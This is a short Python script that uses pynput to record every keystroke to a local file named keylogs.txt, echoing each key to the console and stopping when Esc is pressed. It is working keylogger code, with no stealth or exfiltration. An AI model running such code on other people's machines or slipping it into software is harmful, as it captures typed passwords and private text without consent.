import os
from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(str(key.char))
        print(f"Key pressed: {key.char}")  # Debug print
    except AttributeError:
        if key == keyboard.Key.space:
            with open("keylogs.txt", "a") as f:
                f.write("[SPACE]")
            print("[SPACE]")  # Debug print
        elif key == keyboard.Key.enter:
            with open("keylogs.txt", "a") as f:
                f.write("[ENTER]\n")
            print("[ENTER]")  # Debug print
        else:
            with open("keylogs.txt", "a") as f:
                f.write(f"[{key.name.upper()}]")
            print(f"[{key.name.upper()}]")  # Debug print

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except Exception as e:
        print(f"An error occurred: {e}")  # Debug print